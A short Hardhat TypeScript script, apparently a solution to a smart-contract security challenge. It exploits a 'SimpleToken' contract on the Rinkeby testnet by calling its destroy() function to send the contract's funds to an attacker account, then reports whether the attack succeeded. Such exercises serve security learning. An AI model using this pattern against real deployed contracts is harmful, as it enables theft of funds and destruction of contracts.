import "@ethersproject/abstract-provider"
import { ethers, getNamedAccounts, network } from "hardhat"


import * as dotenv from 'dotenv'
dotenv.config()


const executeExploit= async()=>{
    if(network.name==="rinkeby"){
        const {exploiter}=await getNamedAccounts()
        const simpleToken= await ethers.getContractAt('SimpleToken',process.env.SIMPLE_TOKEN_ADDRESS as string)

        await simpleToken.destroy(exploiter)
        console.log(await simpleToken.name())

        if(!(await simpleToken.name())){
            console.log("Successful attack")
        }else{
            console.log("Attack failed")
        }
    }else{
        console.log("This script can only be executed in rinkeby network")
    }
}

executeExploit().then(()=>process.exit(0)).catch(err=>console.log(err))
